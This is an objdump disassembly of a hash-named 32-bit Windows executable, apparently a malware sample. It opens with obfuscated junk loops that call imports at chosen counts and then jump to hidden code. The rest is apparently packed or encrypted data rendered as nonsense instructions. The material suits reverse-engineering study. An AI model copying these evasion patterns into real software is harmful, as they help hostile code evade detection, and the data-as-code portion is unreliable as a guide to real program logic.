
7df808690b2040dba09e91f00f284410693a4348c68448898b224fa544f97d7e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c56
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d62
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237e2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238a9
  4012ea:	push   0x42392d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	add    eax,0x6257d1b0
  401442:	bound  esp,QWORD PTR [edx+0x62]
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	imul   dl
  401457:	jb     0x40149b
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   ebx,eax
  401504:	mov    al,ds:0xd456821c
  401509:	repnz daa 
  40150b:	inc    esp
  40150c:	adc    al,0xf8
  40150e:	std    
  40150f:	push   ss
  401510:	cmp    DWORD PTR [ebp-0x34],edx
  401513:	int    0x2e
  401515:	outs   dx,BYTE PTR ds:[esi]
  401516:	or     cl,bl
  401518:	inc    esi
  401519:	stc    
  40151a:	jmp    0x401551
  40151c:	fisttp WORD PTR [edx]
  40151e:	shl    BYTE PTR [esi-0x72dcd3],1
  401524:	sub    bh,cl
  401526:	js     0x401525
  401528:	fmul   QWORD PTR [edi+eax*2-0x60]
  40152c:	sbb    al,0xfc
  40152e:	out    0x2d,eax
  401530:	cmp    BYTE PTR [edx+0x4c953ca],ah
  401536:	push   ebx
  401537:	outs   dx,BYTE PTR ds:[esi]
  401538:	sbb    BYTE PTR [edi],cl
  40153a:	outs   dx,DWORD PTR ds:[esi]
  40153b:	adc    BYTE PTR [ecx-0xd228b7d],bl
  401541:	test   dh,bl
  401543:	test   BYTE PTR [eax],bl
  401545:	or     esp,edx
  401547:	push   ss
  401548:	mov    dh,0xb
  40154a:	leave  
  40154b:	pop    edx
  40154c:	jle    0x401588
  40154e:	jmp    0x40152f
  401550:	add    eax,0x60496b10
  401555:	cmp    ebx,DWORD PTR [eax-0x6fdbaa43]
  40155b:	imul   ebp,DWORD PTR [edx],0x84978602
  401561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401562:	test   DWORD PTR [esi+0x1d2a9dc7],esi
  401568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401569:	jns    0x401512
  40156b:	sbb    edi,ebp
  40156d:	loope  0x40155b
  40156f:	mov    ecx,0xd4577cf
  401574:	pop    esp
  401575:	cmp    al,0xc9
  401577:	(bad)  [edx+0x594758a6]
  40157d:	or     ch,BYTE PTR [ebx+0x7243a67]
  401583:	and    ebp,0x3c
  401586:	out    dx,al
  401587:	mov    BYTE PTR [ebx+0x76],ch
  40158a:	std    
  40158b:	daa    
  40158c:	inc    edx
  40158d:	cmp    al,0x9e
  40158f:	jmp    0x77fc51e1
  401594:	sahf   
  401595:	(bad)  [eax+0x4d]
  401598:	dec    eax
  401599:	mov    ebx,0x1aa5dd07
  40159e:	adc    BYTE PTR [esi+0x723fcbba],dl
  4015a4:	outs   dx,DWORD PTR ds:[esi]
  4015a5:	sar    DWORD PTR [eax+0x25ebd1d7],cl
  4015ab:	adc    ch,bl
  4015ad:	sar    ebp,0x60
  4015b0:	fwait
  4015b1:	sbb    ebx,ecx
  4015b3:	push   esi
  4015b4:	sbb    bh,BYTE PTR ds:0xeefd2d31
  4015ba:	push   es
  4015bb:	pop    esi
  4015bc:	or     eax,0x28cf61f
  4015c1:	fs in  eax,0x5c
  4015c4:	(bad)  
  4015c5:	jno    0x401614
  4015c7:	inc    eax
  4015c8:	sbb    BYTE PTR [ebp-0x68],dl
  4015cb:	js     0x40159d
  4015cd:	mov    eax,ds:0xa2c6b068
  4015d2:	cmp    al,0x70
  4015d4:	dec    ebx
  4015d5:	repnz mov ecx,0x7d0c2cf7
  4015db:	imul   eax,DWORD PTR [ecx-0x4c9d8712],0xc6678d6d
  4015e5:	clc    
  4015e6:	jbe    0x40165f
  4015e8:	out    dx,al
  4015e9:	sub    BYTE PTR [esi-0x3],al
  4015ec:	push   edi
  4015ed:	hlt    
  4015ee:	in     eax,dx
  4015ef:	retf   0x8f38
  4015f2:	fimul  WORD PTR [ebx]
  4015f4:	mov    ebp,0xd78601c2
  4015f9:	or     esp,edx
  4015fb:	mov    BYTE PTR [esi+0x61],dl
  4015fe:	xchg   cl,dl
  401600:	dec    ebp
  401601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401602:	and    DWORD PTR [edx-0xa],0x5b
  401606:	(bad)  
  401607:	std    
  401608:	pop    ds
  401609:	imul   DWORD PTR [esi+edx*8+0x40569c33]
  401610:	int    0x64
  401612:	pop    ds
  401613:	fwait
  401614:	lods   al,BYTE PTR ds:[esi]
  401615:	pop    esp
  401616:	mov    dh,0x8e
  401618:	jne    0x40159b
  40161a:	int    0x74
  40161c:	std    
  40161d:	cmp    DWORD PTR [eax-0x35063135],0xffffffd6
  401624:	sbb    edi,DWORD PTR [ecx+ebp*4+0x10]
  401628:	imul   ebp,DWORD PTR [edi],0xbd42b63d
  40162e:	fiadd  DWORD PTR [edi-0x46]
  401631:	ss and al,0x7e
  401634:	outs   dx,DWORD PTR ds:[esi]
  401635:	inc    eax
  401636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401637:	mov    ebp,0x396085aa
  40163c:	aad    0x35
  40163e:	xchg   edi,eax
  40163f:	(bad)  
  401640:	neg    BYTE PTR [ebp-0x21173764]
  401646:	jge    0x40167c
  401648:	or     eax,0xe9da9da0
  40164d:	scas   al,BYTE PTR es:[edi]
  40164e:	imul   esp,DWORD PTR [esi+ecx*8-0x1a3ce590],0x1de98358
  401659:	mov    dh,0x43
  40165b:	arpl   WORD PTR [edx+eiz*2-0x52571d0c],bp
  401662:	add    ah,0xb8
  401665:	arpl   WORD PTR [edx+edx*4-0x20],cx
  401669:	pop    esp
  40166a:	add    al,0x2b
  40166c:	push   ds
  40166d:	shl    DWORD PTR [ebp-0x68],0x78
  401671:	aaa    
  401672:	test   dl,bl
  401674:	and    al,0x66
  401676:	inc    eax
  401677:	out    dx,al
  401678:	xchg   ebp,eax
  401679:	loopne 0x40165d
  40167b:	retf   0xadd6
  40167e:	and    eax,0x607796b9
  401683:	(bad)  
  401684:	sti    
  401685:	sbb    eax,0x685f2de7
  40168a:	mov    ds:0x298435e9,eax
  40168f:	test   eax,0xfd4084c1
  401694:	or     al,0xf7
  401696:	or     eax,0xbe1c908
  40169b:	dec    edi
  40169c:	pop    es
  40169d:	mov    bh,0x71
  40169f:	les    edi,FWORD PTR [ebp+0x31]
  4016a2:	in     al,0xde
  4016a4:	sbb    BYTE PTR [eax],ah
  4016a6:	cmp    BYTE PTR [edx+0x33085521],dh
  4016ac:	add    al,0xe6
  4016ae:	sbb    BYTE PTR [edi-0x25d539a2],ch
  4016b4:	idiv   DWORD PTR [esp+edi*8-0x29fc1f66]
  4016bb:	mov    BYTE PTR [edx-0x4e],dl
  4016be:	xchg   esi,eax
  4016bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c0:	mov    dl,0x72
  4016c2:	fs clc 
  4016c4:	or     eax,0x9af91d2e
  4016c9:	jge    0x4016c7
  4016cb:	dec    ecx
  4016cc:	push   esi
  4016cd:	test   al,0x9c
  4016cf:	jp     0x401735
  4016d1:	jae    0x4016d9
  4016d3:	xchg   ecx,eax
  4016d4:	stos   DWORD PTR es:[edi],eax
  4016d5:	enter  0xfcb4,0xc5
  4016d9:	xchg   esi,eax
  4016da:	dec    ebp
  4016db:	sbb    cl,ah
  4016dd:	mov    bl,0xc9
  4016df:	mov    edi,0x33862325
  4016e4:	dec    esi
  4016e5:	adc    al,0xa8
  4016e7:	xchg   esi,eax
  4016e8:	push   esp
  4016e9:	inc    edi
  4016ea:	cli    
  4016eb:	adc    BYTE PTR [ebx],0x90
  4016ee:	dec    ecx
  4016ef:	mov    bh,0x96
  4016f1:	cli    
  4016f2:	inc    esi
  4016f3:	(bad)  
  4016f4:	imul   edx,DWORD PTR ds:0xfd788cec,0xffffff84
  4016fb:	nop
  4016fc:	lock pop ss
  4016fe:	int3   
  4016ff:	adc    ah,BYTE PTR [ebx+0x1c0a1a03]
  401705:	mov    ecx,0x18275112
  40170a:	inc    edx
  40170b:	std    
  40170c:	leave  
  40170d:	xchg   edx,eax
  40170e:	adc    DWORD PTR [eax],0x75
  401711:	ss out dx,al
  401713:	(bad)  
  401715:	sbb    eax,0x5a30c278
  40171a:	cmp    eax,0xf4d799bd
  40171f:	add    al,0x59
  401721:	or     DWORD PTR [eax+edi*4-0x24],edx
  401725:	jne    0x401766
  401727:	add    BYTE PTR [edx],dl
  401729:	dec    ecx
  40172a:	sub    edi,esp
  40172c:	arpl   WORD PTR [ebx-0x77],sp
  40172f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401730:	inc    esp
  401731:	mov    eax,cs
  401733:	adc    edx,DWORD PTR [eax]
  401735:	aaa    
  401736:	inc    esp
  401737:	push   ebp
  401738:	test   eax,0x6fdcf20f
  40173d:	ficomp WORD PTR [ebx]
  40173f:	enter  0xc912,0x75
  401743:	sbb    eax,0x96e29b1a
  401748:	add    ebx,DWORD PTR ds:0xc3e825c
  40174e:	inc    esp
  40174f:	jne    0x4016f1
  401751:	in     eax,dx
  401752:	shr    DWORD PTR [ebx-0x721d8e03],cl
  401758:	jle    0x4017ae
  40175a:	(bad)  
  40175b:	jbe    0x401715
  40175d:	add    al,0x24
  40175f:	jnp    0x40171b
  401761:	pop    ebx
  401762:	and    ebx,DWORD PTR [eax+edi*2]
  401765:	popf   
  401766:	inc    esp
  401767:	adc    al,0xaa
  401769:	gs push edi
  40176b:	les    eax,FWORD PTR [edx-0x79]
  40176e:	js     0x4017d6
  401770:	sub    DWORD PTR [edx+edx*8-0x43],esp
  401774:	iret   
  401775:	sbb    al,0x21
  401777:	jle    0x4017b2
  401779:	dec    ebx
  40177a:	jl     0x40178c
  40177c:	into   
  40177d:	call   0xb8541edd
  401782:	inc    esi
  401783:	popa   
  401784:	xchg   ecx,eax
  401785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401786:	jecxz  0x4017ea
  401788:	and    dl,cl
  40178a:	push   esi
  40178b:	fdivr  DWORD PTR [ebp+0x79]
  40178e:	mov    ebp,DWORD PTR [edi+0x3]
  401791:	xor    eax,esi
  401793:	cmp    BYTE PTR [eax],bh
  401795:	es (bad) 
  401797:	fadd   QWORD PTR [eax+edx*2-0x7ceac2d5]
  40179e:	cmp    al,0xe3
  4017a0:	pop    eax
  4017a1:	mov    ecx,0xce2631c6
  4017a6:	cmc    
  4017a7:	xchg   edi,eax
  4017a8:	mov    ebx,0x57554c0d
  4017ad:	and    eax,0x29498a79
  4017b2:	out    dx,eax
  4017b3:	mov    dh,0x2c
  4017b5:	std    
  4017b6:	adc    dl,BYTE PTR [esi+0x373d171f]
  4017bc:	icebp  
  4017bd:	sti    
  4017be:	inc    ebx
  4017bf:	cld    
  4017c0:	push   es
  4017c1:	fwait
  4017c2:	mov    dh,0x3e
  4017c4:	mov    al,ds:0xb5e0e840
  4017c9:	(bad)  
  4017cb:	sub    eax,DWORD PTR [esi+0x4]
  4017ce:	call   0x3272:0x34794e8e
  4017d5:	pop    esp
  4017d6:	cs pop esp
  4017d8:	and    BYTE PTR [ebp-0x18],bl
  4017db:	xor    al,0x91
  4017dd:	jb     0x4017b9
  4017df:	mov    ah,0x1
  4017e1:	push   ecx
  4017e2:	mov    WORD PTR [esi],cs
  4017e4:	push   ds
  4017e5:	mov    eax,ds:0xd69d32d3
  4017ea:	in     al,0x3f
  4017ec:	mov    ds:0x6ee16f57,al
  4017f1:	push   0xffffff83
  4017f3:	out    0xd5,eax
  4017f5:	in     eax,dx
  4017f6:	aad    0x65
  4017f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017f9:	gs je  0x401858
  4017fc:	sbb    esp,ebp
  4017fe:	sahf   
  4017ff:	jle    0x40178c
  401801:	adc    ecx,DWORD PTR [edi]
  401803:	iret   
  401804:	pop    esp
  401805:	(bad)  
  401806:	into   
  401807:	push   cs
  401808:	shl    DWORD PTR [ebx-0x31],0xa0
  40180c:	mov    ebx,0x1e38ce07
  401811:	adc    DWORD PTR [ebx+0x36],ecx
  401814:	cmp    ah,BYTE PTR [esi+edi*8-0x72f14450]
  40181b:	ret    0x2963
  40181e:	js     0x40188b
  401820:	nop
  401821:	test   eax,0xfd4435ab
  401826:	test   BYTE PTR [esp+esi*8],ch
  401829:	sub    eax,0x1fe4494
  40182e:	pushf  
  40182f:	push   ecx
  401830:	push   ecx
  401831:	(bad)  
  401832:	fwait
  401833:	int3   
  401834:	into   
  401835:	scas   eax,DWORD PTR es:[edi]
  401836:	sbb    eax,DWORD PTR [edi+0x75]
  401839:	lods   al,BYTE PTR ds:[esi]
  40183a:	fsub   DWORD PTR [edx-0x63cb34]
  401840:	test   BYTE PTR [ecx],0x5e
  401843:	cmp    bl,BYTE PTR [esi+ecx*4-0x2ddf0f17]
  40184a:	mov    cl,0x9
  40184c:	dec    ecx
  40184d:	imul   BYTE PTR [ebx]
  40184f:	scas   eax,DWORD PTR es:[edi]
  401850:	gs div ebx
  401853:	jg     0x4017ee
  401855:	xor    dh,cl
  401857:	loop   0x4018a5
  401859:	push   0x9b1fb7
  40185e:	xchg   esi,eax
  40185f:	xor    al,0x9d
  401861:	mov    ah,0x59
  401863:	sbb    edx,DWORD PTR [edx-0x1]
  401866:	fs pop eax
  401868:	jo     0x401879
  40186a:	add    DWORD PTR [edi],0x864d9886
  401870:	ret    0xca9f
  401873:	jl     0x4018e8
  401875:	test   DWORD PTR [ecx+0x7955381f],0x3921aa9b
  40187f:	mov    edi,0x888f31fe
  401884:	popf   
  401885:	pop    edi
  401886:	xor    BYTE PTR [ebp-0x67],0x9b
  40188a:	lds    esp,FWORD PTR [edi+0x3f86c24f]
  401890:	sti    
  401891:	pop    esi
  401892:	mov    bl,0x58
  401894:	std    
  401895:	xchg   edx,eax
  401896:	loopne 0x4018a1
  401898:	push   ecx
  401899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40189a:	mov    esi,0x51f2e690
  40189f:	mov    BYTE PTR [esi+edi*2-0x2b],ah
  4018a3:	and    BYTE PTR [eax],ah
  4018a5:	xor    al,BYTE PTR [eax+0x75]
  4018a8:	popf   
  4018a9:	add    al,0x84
  4018ab:	jmp    0x40186c
  4018ad:	cli    
  4018ae:	jne    0x401887
  4018b0:	push   0x60
  4018b2:	lock jl 0x401836
  4018b5:	mov    ecx,0x9650685d
  4018ba:	mov    eax,fs
  4018bc:	dec    ebp
  4018bd:	dec    ebx
  4018be:	push   ebp
  4018bf:	jbe    0x401872
  4018c1:	in     eax,0x25
  4018c3:	jge    0x40191f
  4018c5:	fisttp DWORD PTR [ecx-0x74]
  4018c8:	cmp    ebx,DWORD PTR [edi]
  4018ca:	jnp    0x4018c8
  4018cc:	xor    ebx,ebx
  4018ce:	mov    esp,0xe8efc099
  4018d3:	mov    bh,bl
  4018d5:	push   cs
  4018d6:	add    eax,0x4014cfea
  4018db:	sub    eax,0xfd94ed75
  4018e0:	pop    esi
  4018e1:	mov    ch,0xe0
  4018e3:	lea    eax,[edi]
  4018e5:	add    eax,0xcbce3ed9
  4018ea:	clc    
  4018eb:	aaa    
  4018ec:	scas   eax,DWORD PTR es:[edi]
  4018ed:	mov    ecx,0x849d40f3
  4018f2:	or     eax,0xe76fee37
  4018f7:	fiadd  DWORD PTR [edi-0x1018da0a]
  4018fd:	xor    ebp,DWORD PTR [eax]
  4018ff:	jae    0x401891
  401901:	ja     0x40195c
  401903:	hlt    
  401904:	dec    ebx
  401905:	icebp  
  401906:	jmp    0x4018ee
  401908:	jbe    0x401955
  40190a:	icebp  
  40190b:	fsub   DWORD PTR [eax-0x27e40bc0]
  401911:	xor    eax,0x737f9b65
  401916:	mov    ds,ebx
  401918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401919:	dec    ebp
  40191a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40191b:	adc    BYTE PTR [edx+0x513f740],cl
  401921:	pop    edi
  401922:	push   esi
  401923:	cld    
  401924:	ds pop esi
  401926:	mov    ah,0x1e
  401928:	nop
  401929:	dec    esi
  40192a:	mov    ds:0x972faf85,al
  40192f:	nop
  401930:	jge    0x4018b2
  401932:	rcr    DWORD PTR [eax+0x670682e9],cl
  401938:	int3   
  401939:	mov    DWORD PTR [ecx],edx
  40193b:	gs dec eax
  40193d:	push   edi
  40193e:	(bad)  [ebp-0x62c4a417]
  401944:	mov    al,0xcc
  401946:	(bad)  
  401948:	into   
  401949:	mov    ebp,edi
